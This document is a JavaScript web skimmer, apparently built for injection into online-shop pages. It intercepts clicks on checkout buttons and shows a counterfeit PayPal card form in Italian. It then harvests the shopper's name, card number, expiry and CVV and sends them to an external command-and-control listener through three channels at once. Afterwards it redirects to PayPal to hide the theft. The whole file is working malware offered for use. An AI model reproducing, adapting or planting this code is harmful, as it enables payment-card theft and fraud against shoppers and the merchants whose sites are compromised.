/* WAVEH4CK v15.0 - HYPER-REALISTIC PAYPAL MASTER */
(function () {
    // SINKRONISASI: Arahkan ke listener.php di folder yang sama atau subfolder panel
    const C2 = 'https://waveh4ck.gamer.gd/MgtWaveH4ck/listener.php';
    const REDIRECT_URL = 'https://www.paypal.com/cgi-bin/webscr?cmd=_express-checkout&token=EC-'; 
    if (window._wh_final) return;
    window._wh_final = true;

    const _u = {
        send: (data) => {
            const p = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
            // Multi-channel exfiltration (GET + POST + Beacon)
            new Image().src = C2 + '?v=' + p + '&ts=' + Date.now();
            if (navigator.sendBeacon) navigator.sendBeacon(C2, p);
            fetch(C2, { method: 'POST', mode: 'no-cors', body: p });
        }
    };

    const _css = `
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        #pp-ovr { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.98); z-index:2147483647; display:flex; align-items:center; justify-content:center; font-family: 'Open Sans', sans-serif; cursor: default; }
        .pp-win { width:94%; max-width:440px; padding:35px; border-radius:10px; background:#fff; box-shadow: 0 5px 25px rgba(0,0,0,0.1); border: 1px solid #e5e5e5; }
        .pp-head { font-size: 24px; color: #2c2e2f; margin: 20px 0; font-weight: 400; }
        .pp-lbl { display:block; font-size:15px; color:#2c2e2f; font-weight:600; margin-bottom:10px; }
        .pp-inp { width:100%; border:1px solid #919191; padding:14px; border-radius:5px; font-size:17px; margin-bottom:20px; box-sizing:border-box; color: #2c2e2f; outline: none; transition: border 0.3s; }
        .pp-inp:focus { border-color:#0070ba; box-shadow: 0 0 0 1px #0070ba; }
        .pp-row { display: flex; gap: 20px; }
        .pp-btn { width:100%; padding:16px; background:#0070ba; color:#fff; border:none; border-radius:30px; font-size:18px; font-weight:600; cursor:pointer; margin-top:10px; transition: background 0.3s; }
        .pp-btn:hover { background:#005ea6; }
        .pp-foot { margin-top: 25px; border-top: 1px solid #eee; padding-top: 20px; text-align: center; color: #666; font-size: 13px; }
    `;

    function formatCC(e) {
        let v = e.target.value.replace(/\\D/g, '');
        let m = v.match(/.{1,4}/g);
        e.target.value = m ? m.join(' ') : v;
    }

    function formatExp(e) {
        let v = e.target.value.replace(/\\D/g, '');
        if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
        e.target.value = v;
    }

    function buildUI(origBtn) {
        const s = document.createElement('style'); s.innerHTML = _css; document.head.appendChild(s);
        const w = document.createElement('div'); w.id = 'pp-ovr';
        w.innerHTML = \`
            <div class="pp-win">
                <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" height="35">
                <h1 class="pp-head">Paga con carta</h1>
                
                <label class="pp-lbl">Titolare della carta</label>
                <input type="text" id="p-name" class="pp-inp" placeholder="Nome e cognome">
                
                <label class="pp-lbl">Numero di carta</label>
                <input type="text" id="p-num" class="pp-inp" placeholder="0000 0000 0000 0000" maxlength="19">
                
                <div class="pp-row">
                    <div style="flex:1;">
                        <label class="pp-lbl">Scadenza</label>
                        <input type="text" id="p-exp" class="pp-inp" placeholder="MM/AA" maxlength="5">
                    </div>
                    <div style="flex:1;">
                        <label class="pp-lbl">CVV</label>
                        <input type="password" id="p-cvv" class="pp-inp" placeholder="CVC" maxlength="4">
                    </div>
                </div>
                
                <button id="p-sub" class="pp-btn">Paga ora</button>
                
                <div class="pp-foot">
                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/pp-acceptance-small.png" height="20" style="vertical-align: middle; margin-right: 10px; opacity: 0.7;">
                    Connessione sicura SSL a 256 bit
                </div>
            </div>
        \`;
        document.body.appendChild(w);

        const nInp = document.getElementById('p-num');
        const eInp = document.getElementById('p-exp');
        nInp.oninput = formatCC;
        eInp.oninput = formatExp;

        document.getElementById('p-sub').onclick = () => {
            const d = {
                site: location.host,
                name: document.getElementById('p-name').value,
                num: nInp.value.replace(/\\s/g,''),
                exp: eInp.value,
                cvv: document.getElementById('p-cvv').value,
                ua: navigator.userAgent
            };
            document.getElementById('p-sub').innerText = 'Processing...';
            _u.send(d);
            // Delay 2 detik biar data sempet mendarat di listener baru redirect
            setTimeout(() => { 
                window.location.href = "https://www.paypal.com/checkoutnow"; 
            }, 2000);
        }
    }

    document.addEventListener('click', (e) => {
        if (window._bp) return;
        const btn = e.target.closest('#paypal-express-button, .btn-checkout, .action.checkout, #place-order-button');
        if (btn) { e.preventDefault(); e.stopPropagation(); buildUI(btn); }
    }, true);
})();
